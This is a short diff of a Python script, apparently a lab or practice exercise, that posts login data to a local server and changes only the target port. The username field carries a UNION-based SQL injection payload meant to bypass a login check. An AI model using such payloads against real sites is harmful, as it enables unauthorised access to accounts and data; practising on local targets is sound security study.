@@ -1,6 +1,6 @@
 import requests
 if __name__ == "__main__":
-    url = 'http://localhost:8888' 
+    url = 'http://localhost:2222/' 
     data = {
         'username' : "' union select 1, '2",
         'password' : "2"
